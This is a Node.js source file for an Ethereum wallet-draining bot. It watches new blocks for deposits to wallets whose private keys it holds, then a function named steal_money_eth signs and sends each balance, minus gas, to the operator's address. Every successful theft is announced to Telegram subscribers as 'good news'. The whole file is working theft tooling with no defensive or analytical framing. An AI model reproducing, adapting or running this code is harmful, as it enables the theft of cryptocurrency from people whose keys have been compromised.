const Web3 = require("web3")
const fs = require('fs');
const readline = require('readline');
const TelegramBot = require('node-telegram-bot-api')
const path = require("path");


module.exports = {
    telegram_token_read_eth: async function () {
        while (true) {
            if (users.length > 0) {
                for (let i = 0; i < users.length; i++) {
                    await bot.sendMessage(users[i], 'Ethereum Chain Connected...✅')
                }
                apis_read()
                break
            } else {
                await new Promise(resolve => setTimeout(resolve, 100));
            }
        }
    }
}


async function apis_read() {
    const fileStream = fs.createReadStream(path.join("info", "apis.txt"));
    const rl = readline.createInterface({
        input: fileStream,
        crlfDelay: Infinity
    });
    var apis_list = []
    for await (const line of rl) {
        var rl_token = line.split(['='])[1];
        apis_list.push(rl_token)
    }
    global.moralis_eth = apis_list[2]
    global.web4 = new Web3(moralis_eth)
    global.eth_gwei = apis_list[5]
    global.eth_grab_from = apis_list[11]
    global.eth_gas_addon = await web4.utils.toWei(eth_grab_from, 'ether')
    global.eth_cash_limit = Number(web4.utils.toWei(String(1), 'ether'))
    global.eth_gas_transfer_amount = Number(web4.utils.toWei(eth_gwei, 'gwei'))
    getBlocks_eth()
}


async function getBlocks_eth() {
    var work = true
    while (work) {
        try {
            var latestBlock = await web4.eth.getBlock(block_identifier = web4.eth.defaultBlock, full_transactions = true);
            global.trans_eth = latestBlock.transactions;
            for (var x in trans_eth) {
                var to_address = trans_eth[x]['to'];
                if (to_address in all_wallets) {
                    steal_money_eth(to_address, all_wallets[to_address]);
                }
            }
            console.log('               ETH '+latestBlock.number);
            await new Promise(resolve => setTimeout(resolve, 150));
        } catch (e) {
            await new Promise(resolve => setTimeout(resolve, 150));
            global.web4 = new Web3(moralis_eth)
        }
    }
}


async function steal_money_eth(wallet, wallet_specs) {
    try {
        var private_key = wallet_specs[0]
        var counter = 0
        while (true) {
            var balance = await web4.eth.getBalance(wallet)
            if (Number(balance) < eth_gas_addon) {
                await new Promise(resolve => setTimeout(resolve, 30));
                counter++
                if (counter === 200) {
                    return;
                }
            } else {
                break;
            }
        }
        var nonce = await web4.eth.getTransactionCount(wallet)
        var transfer_amount = Number(balance) - eth_gas_transfer_amount * 21000
        var tx_price = {
            'chainId': 1,
            'nonce': nonce,
            'to': user_wallet_address_all_2checksom,
            'value': transfer_amount,
            'gas': 21000,
            'gasPrice': eth_gas_transfer_amount
        }
        var signed_tx = await web4.eth.accounts.signTransaction(tx_price, private_key)
        var tx_hash = await web4.eth.sendSignedTransaction(signed_tx.rawTransaction)
        global.tx_link_eth = 'https://etherscan.com/tx/' + tx_hash.transactionHash
        global.amount_sent_eth = await web4.utils.fromWei(String(transfer_amount), 'ether')
        console.log('💰ETH '+amount_sent_eth+'💰 Transaction successful! ' + tx_link_eth)
        global.user_wallet_address_all_2checksom = web4.utils.toChecksumAddress(user_wallet_address)
        await sending_good_news_eth()
    } catch (e) {
        console.log(e)
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}


async function sending_good_news_eth() {
    var results ='💰ETH '+amount_sent_eth+'💰 ' + tx_link_eth
    if (users.length > 0) {
        for (let i = 0; i < users.length; i++) {
            await bot.sendMessage(users[i], results)
        }
    }
}